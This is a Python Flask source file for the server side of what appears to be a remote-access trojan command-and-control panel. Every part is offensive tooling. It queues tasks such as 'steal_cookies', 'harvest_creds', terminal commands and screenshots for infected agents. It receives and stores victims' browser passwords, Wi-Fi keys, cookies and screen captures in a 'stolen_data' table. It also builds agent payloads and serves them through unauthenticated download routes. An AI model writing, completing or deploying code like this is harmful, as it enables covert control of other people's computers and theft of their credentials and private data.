import os
import sqlite3
from flask import jsonify, request, Response, send_from_directory
from flask_login import login_required
from datetime import datetime
import json
import base64
import traceback
from werkzeug.security import generate_password_hash
from glycon.secure_comms import SecureComms
from glycon.config import CONFIG

def init_api_routes(app, socketio):
    @app.route('/api/task', methods=['POST'])
    @login_required
    def create_task():
        try:
            if request.content_type != 'application/json':
                return jsonify({
                    "status": "error", 
                    "message": "Content-Type must be application/json"
                }), 415

            data = request.get_json()
            if not data:
                return jsonify({
                    "status": "error", 
                    "message": "No JSON data provided"
                }), 400
            
            required_fields = ['agent_id', 'task_type']
            if not all(field in data for field in required_fields):
                return jsonify({
                    "status": "error", 
                    "message": f"Missing required fields: {required_fields}"
                }), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            task_data = data.get('task_data', {})
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, 
                    data['agent_id'], 
                    data['task_type'], 
                    json.dumps(task_data),
                    'pending', 
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            
            if data['task_type'] == 'websocket':
                ws_connected = 1 if data.get('action') == 'start' else 0
                c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
                        (ws_connected, data['agent_id']))
                conn.commit()
            
            conn.close()
            
            socketio.emit('new_task', {
                'task_id': task_id,
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({
                "status": "success", 
                "task_id": task_id
            })

        except Exception as e:
            app.logger.error(f"Error creating task: {str(e)}")
            return jsonify({
                "status": "error", 
                "message": str(e)
            }), 500

    @app.route('/api/checkin', methods=['POST'])
    def agent_checkin():
        conn = None
        try:
            if not request.data:
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            try:
                data = SecureComms.decrypt(request.data)
                app.logger.debug(f"Received checkin from agent: {data['agent_id']}")
            except Exception as e:
                app.logger.error(f"Decryption error: {str(e)}")
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            conn = sqlite3.connect(CONFIG.database)
            conn.execute("PRAGMA journal_mode=WAL")
            c = conn.cursor()

            c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
            agent = c.fetchone()
            current_ws_status = agent[0] if agent else 0

            c.execute('''INSERT OR REPLACE INTO agents 
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                     (data['agent_id'],
                      data.get('hostname', 'UNKNOWN'),
                      data.get('ip', '0.0.0.0'),
                      data.get('os', 'UNKNOWN'),
                      datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ,
                      'online',
                      data.get('privilege', 'user'),
                      current_ws_status))

            if 'credentials' in data:
                creds = data['credentials']
                for cred in creds.get('browsers', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  cred.get('browser', 'unknown'),
                                  cred.get('url', ''),
                                  cred.get('username', ''),
                                  cred.get('password', ''),
                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing credential: {str(e)}")
                        continue

                for wifi in creds.get('wifi', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  'wifi',
                                  '',
                                  wifi.get('ssid', ''),
                                  wifi.get('password', ''),
                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing wifi: {str(e)}")
                        continue

            if 'screenshot' in data:
                try:
                    if isinstance(data['screenshot'], str):
                        image_data = base64.b64decode(data['screenshot'])
                    else:
                        image_data = data['screenshot']
                    
                    if len(image_data) > 10 * 1024 * 1024:
                        raise ValueError("Screenshot too large")
                    
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'],
                              image_data,
                              datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing screenshot: {str(e)}")

            c.execute('''SELECT id, task_type, task_data FROM tasks 
                         WHERE agent_id=? AND status='pending'
                         ORDER BY created_at LIMIT 1''',
                     (data['agent_id'],))
            task = c.fetchone()

            if task:
                c.execute("UPDATE tasks SET status='executing' WHERE id=?", (task[0],))
                response = {
                    'task_id': task[0],
                    'type': task[1],
                    'data': json.loads(task[2])
                }
            else:
                response = {'type': 'noop'}

            conn.commit()
            conn.close()

            encrypted_response = SecureComms.encrypt(response)
            return Response(encrypted_response,
                          mimetype='application/octet-stream')

        except Exception as e:
            app.logger.error(f"Checkin error: {str(e)}")
            if conn:
                conn.rollback()
                conn.close()
            return Response(SecureComms.encrypt({'type': 'noop'}),
                          mimetype='application/octet-stream')

    @app.route('/api/screenshots/<int:screenshot_id>', methods=['DELETE'])
    @login_required
    def delete_screenshot(screenshot_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("SELECT id, agent_id FROM screenshots WHERE id = ?", (screenshot_id,))
            screenshot = c.fetchone()
            
            if not screenshot:
                return jsonify({"status": "error", "message": "Screenshot not found"}), 404
                
            c.execute("DELETE FROM screenshots WHERE id = ?", (screenshot_id,))
            
            conn.commit()
            
            socketio.emit('screenshot_deleted', {
                'screenshot_id': screenshot_id,
                'agent_id': screenshot[1]
            })
            
            return jsonify({"status": "success"}), 200
            
        except Exception as e:
            app.logger.error(f"Error deleting screenshot: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/task_result', methods=['POST'])
    def task_result():
        conn = None
        try:
            # Decrypt and validate incoming data
            if not request.data:
                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
                
            data = SecureComms.decrypt(request.data)
            if not data or 'task_id' not in data or 'agent_id' not in data:
                return jsonify({'status': 'error', 'message': 'Invalid task result format'}), 400
                
            app.logger.info(f"Processing task result for task ID: {data['task_id']}")

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Update task status
            c.execute('''UPDATE tasks SET status='completed', completed_at=?
                        WHERE id=?''', 
                    (datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , data['task_id']))
            
            # Handle different task types
            if data['task_type'] == 'steal_cookies' and 'result' in data and 'results' in data['result']:
                app.logger.info(f"Processing cookie data from {len(data['result']['results'])} browsers")
                
                for result in data['result']['results']:
                    try:
                        # Validate required fields
                        if 'browser' not in result:
                            app.logger.error("Missing browser field in cookie result")
                            continue
                            
                        if 'zip_content' not in result:
                            app.logger.error(f"Missing zip_content in {result['browser']} cookie result")
                            continue
                            
                        # Decode and validate cookie data
                        try:
                            cookie_data = base64.b64decode(result['zip_content'])
                            if not cookie_data:
                                app.logger.error(f"Empty cookie data for {result['browser']}")
                                continue
                                
                            # Verify the data is valid JSON
                            try:
                                json.loads(cookie_data.decode('utf-8'))
                            except ValueError:
                                app.logger.error(f"Invalid JSON in {result['browser']} cookie data")
                                continue
                                
                        except Exception as e:
                            app.logger.error(f"Failed to decode {result['browser']} cookie data: {str(e)}")
                            continue
                        
                        # Store in database
                        c.execute('''INSERT INTO stolen_data 
                                    (agent_id, browser, data_type, content, system_info, timestamp)
                                    VALUES (?, ?, ?, ?, ?, ?)''',
                                (data['agent_id'],
                                result['browser'],
                                'cookies',
                                sqlite3.Binary(cookie_data),
                                json.dumps(result.get('system_info', {})),
                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                        
                        app.logger.info(f"Successfully stored {result['browser']} cookies")
                        
                    except Exception as e:
                        app.logger.error(f"Failed to process {result.get('browser', 'unknown')} cookies: {str(e)}")
                        continue
            
            # Handle websocket status updates
            if data['task_type'] == 'websocket':
                ws_connected = 1 if (data['result'].get('status') == 'success' and 
                                'connected' in data['result'].get('message', '').lower()) else 0
                c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                        (ws_connected, data['agent_id']))
                
                socketio.emit('ws_status', {
                    'agent_id': data['agent_id'],
                    'action': data['result'].get('action', ''),
                    'status': 'success' if ws_connected else 'error',
                    'message': data['result'].get('message', '')
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            # Handle terminal output
            if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
                socketio.emit('terminal_output', {
                    'agent_id': data['agent_id'],
                    'command': data['result'].get('command', ''),
                    'output': data['result'].get('output', ''),
                    'error': data['result'].get('error', ''),
                    'current_dir': data['result'].get('current_dir', ''),
                    'task_id': data['task_id']
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')

            # Handle screenshots
            if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
                try:
                    image_data = base64.b64decode(data['result']['screenshot'])
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                            (None, data['agent_id'], 
                            image_data,
                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing screenshot: {str(e)}")

            # Handle credential harvesting
            if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
                for cred in data['result']['credentials']:
                    try:
                        c.execute('''INSERT INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                (None, data['agent_id'],
                                cred.get('browser', ''),
                                cred.get('url', ''),
                                cred.get('username', ''),
                                cred.get('password', ''),
                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing credential: {str(e)}")
                        pass
            
            conn.commit()
            
            # Notify clients of task completion
            socketio.emit('task_complete', {
                'task_id': data['task_id'],
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({'status': 'success'})
            
        except Exception as e:
            app.logger.error(f"Task result processing error: {str(e)}")
            if conn:
                try:
                    conn.rollback()
                except:
                    pass
            return jsonify({'status': 'error', 'message': str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/download_stolen_data/<int:data_id>')
    @login_required
    def download_stolen_data(data_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT browser, content FROM stolen_data WHERE id=?", (data_id,))
        data = c.fetchone()
        conn.close()
        
        if not data:
            return jsonify({"status": "error", "message": "Data not found"}), 404
        
        browser, content = data
        return Response(
            content,
            mimetype='application/json',
            headers={
                'Content-Disposition': f'attachment; filename={browser}_cookies.json'
            }
        )

    @app.route('/api/generate_agent', methods=['POST'])
    @login_required
    def generate_agent():
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400

            agents_dir = os.path.join(app.root_path, 'agents')
            os.makedirs(agents_dir, exist_ok=True)

            config = {
                'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
                'server_url': data.get('server_url', request.url_root).strip('/'),
                'take_screenshots': bool(data.get('take_screenshots', True)),
                'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100))
            }

            template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
            if not os.path.exists(template_path):
                return jsonify({"status": "error", "message": "Agent template not found"}), 500

            with open(template_path, 'r') as f:
                template = f.read()

            agent_code = template.format(
                checkin_interval=config['checkin_interval'],
                server_url=config['server_url'],
                take_screenshots=str(config['take_screenshots']),
                screenshot_frequency=config['screenshot_frequency']
            )

            agent_path = os.path.join(agents_dir, 'agent.py')
            with open(agent_path, 'w') as f:
                f.write(agent_code)

            return jsonify({
                "status": "success",
                "message": "Agent configuration saved",
                "config": config
            })

        except Exception as e:
            app.logger.error(f"Error generating agent: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Internal server error: {str(e)}"
            }), 500

    @app.route('/a/d')
    #@login_required
    def download_agent():
        agents_dir = os.path.join(app.root_path, 'agents')
        if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
            return jsonify({"status": "error", "message": "Agent file not found"}), 404
        return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
    
    @app.route('/a/p')
    #@login_required
    def download_python():
        agents_dir = os.path.join(app.root_path, 'agents')
        if not os.path.exists(os.path.join(agents_dir, 'p.zip')):
            return jsonify({"status": "error", "message": "p not found"}), 404
        return send_from_directory(agents_dir, 'p.zip', as_attachment=True)

    @app.route('/api/stolen_data/<int:data_id>', methods=['DELETE'])
    @login_required
    def delete_stolen_data(data_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("DELETE FROM stolen_data WHERE id=?", (data_id,))
            conn.commit()
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()